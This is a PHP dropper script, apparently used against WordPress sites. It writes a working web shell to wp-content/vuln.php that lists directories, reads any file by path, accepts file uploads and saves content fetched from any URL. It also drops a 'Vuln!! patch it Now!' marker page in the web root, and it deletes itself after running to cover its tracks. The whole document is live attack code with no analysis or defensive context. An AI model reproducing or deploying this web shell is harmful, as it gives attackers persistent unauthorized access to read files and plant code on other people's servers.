<title>Vuln!! patch it Now!</title>
<?php
function http_get($url){
	$im = curl_init($url);
	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($im, CURLOPT_HEADER, 0);
	return curl_exec($im);
	curl_close($im);
}
$s = '<b>Retrieve File/Scan Directory</b> <br />Current file path: <?php echo _FILE_; ?> <br /><form method="GET" action=""><input type="text" name="path" size="50" value="<?php if (isset($_GET['path'])) { echo $_GET['path']; } ?>" /><button type="submit">Go</button></form><pre><?php if (isset($_GET['path'])) { if ($_GET['path'] == '') { $path = './'; } else { $path = $_GET['path']; } echo '<b>Realpath:</b> ' . realpath($_GET['path']) . '<br />'; echo '<b>Type:</b> '; if (is_dir($path)) { echo 'Directory <br />'; foreach (scandir($path) as $data) { echo $data . "<br />"; } } else { echo 'File <br />'; print_r(file_get_contents($path)); } } ?></pre><hr /><b>Upload File From Your Local</b> <br /><form method="POST" action="" enctype="multipart/form-data">File(s): <input type="file" name="uploads[]" multiple="multiple" required="required" /><button type="submit">Upload</button></form><?php if (isset($_FILES['uploads']) && count($_FILES['uploads']) > 0) { $total = count($_FILES['uploads']['name']); for ($i = 0; $i < $total; $i++) { $tmpPath = $_FILES['uploads']['tmp_name'][$i]; if ($tmpPath != '') { $newPath = './' . $_FILES['uploads']['name'][$i]; if (move_uploaded_file($tmpPath, $newPath)) { echo 'Successfully uploaded ' .$_FILES['uploads']['name'][$i] . '<br />'; } else { echo 'Unable to upload ' .$_FILES['uploads']['name'][$i] . '<br />'; } } } } ?><hr /><b>Upload File From URL</b> <br /><form method="POST" action="">Filename to save: <input type="text" name="save_name" size="30" required="required" /> <br />URL: <input type="text" name="url" size="50" required="required" /><button type="submit">Upload</button></form><pre><?php if (isset($_POST['save_name']) && isset($_POST['url'])) { if (file_put_contents($_POST['save_name'], file_get_contents($_POST['url']))) { echo 'Successfully uploaded ' . $_POST['save_name']; } else { echo 'Unable to upload ' . $_POST['save_name']; } } ?></pre>';
$check = $_SERVER['DOCUMENT_ROOT'] . "/wp-content/vuln.php";
$text = $s;
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
    echo $check."</br>";
}else 
  echo "not exits";
echo "done .\n " ;

$check2 = $_SERVER['DOCUMENT_ROOT'] . "/vuln.htm" ;
$text2 = 'Vuln!! patch it Now!';
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
    echo $check2."</br>";
}else 
  echo "not exits";
echo "done .\n " ;

@unlink(__FILE__);
?>
